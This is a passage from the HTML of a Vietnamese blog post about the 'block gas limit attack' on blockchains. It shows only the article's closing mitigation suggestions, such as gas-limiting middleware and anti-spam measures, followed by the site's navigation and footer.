highlighter-rouge">blockSize</code> lên, nhưng vẫn làm cho các transaction của user bị delay 1 khoảng thời gian trước khi được thực sự xử lý</p><p>Sau đây sẽ là 1 số đề xuất khắc phục lỗi này:</p><ol><li>Xây dựng middleware để kiểm soát lượng gas trong 1 transaction được gửi tới node<li>Chỉ cho phép gửi transaction với 1 số lượng nhất định<li>Xây dựng các mô hình tránh spam khác</ol><p style="font-size: 25px; font-weight: bold">Thank you for your reading and keep update with me</p></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Block gas limit attack - imduchuyyy&url=https://imduchuyyy.github.io/posts/block-gas-limit-attack/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Block gas limit attack - imduchuyyy&u=https://imduchuyyy.github.io/posts/block-gas-limit-attack/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Block gas limit attack - imduchuyyy&url=https://imduchuyyy.github.io/posts/block-gas-limit-attack/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/what-is-liquid-staking/">Why we need liquid staking?</a><li><a href="/posts/explain-mpc-by-math-concepts/">[Research] Explain MPC by basic math concepts</a><li><a href="/posts/smart-contract-best-practice-3/">Smart contract best practice 3</a><li><a href="/posts/block-gas-limit-attack/">Block gas limit attack</a><li><a href="/posts/varieties-of-proof-of-stake/">Varieties of Proof of Stake!</a></ul></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/what-is-liquid-staking/"><div class="card-body"> <span class="timeago small" >Sep 3<i class="unloaded">2024-09-03T18:21:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Why we need liquid staking?</h3><div class="text-muted small"><p> Heyyy, trong một ngày mưa gió, ngồi ở quán cafe ngắm đường phố, cũng rảnh rỗi nên viết bài chia sẽ 1 xíu với mọi người về Liquid Staking nhen. Topic liquid staking thực sự cũng không mới, chỉ cần l...</p></div></div></a></div><div class="card"> <a href="/posts/how-to-send-a-sponsor-transaction/"><div class="card-body"> <span class="timeago small" >Aug 19<i class="unloaded">2024-08-19T14:51:30+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>How to send a sponsor transactions?</h3><div class="text-muted small"><p> GM GM mọi người, hôm nay mình cùng nhau đi tìm hiểu có cách nào để giải quyết vấn để sponsor transaction trên blockchain không?. Có cách nào để giúp trải nghiệm của người dùng mượt mà hơn ví dụ như...</p></div></div></a></div><div class="card"> <a href="/posts/back-to-blogging/"><div class="card-body"> <span class="timeago small" >Aug 14<i class="unloaded">2024-08-14T12:00:30+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Back To Blogging</h3><div class="text-muted small"><p> GM GM, Đã hơn 8 tháng rồi mình không quay lại viết blog, đến mức mà domain nottheblog hết hạn luôn rồi =)). Check lại thì bài gần nhất đã từ tháng 12 2023. Thật ra là mình vẫn có viết, viết trên ch...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/smart-contract-best-practice-3/" class="btn btn-outline-primary" prompt="Older"><p>Smart contract best practice 3</p></a> <a href="/posts/varieties-of-proof-of-stake/" class="btn btn-outline-primary" prompt="Newer"><p>Varieties of Proof of Stake!</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/imduchuyyy">imduchuyyy</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-4KTN6TMKWE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-4KTN6TMKWE'); }); </script>
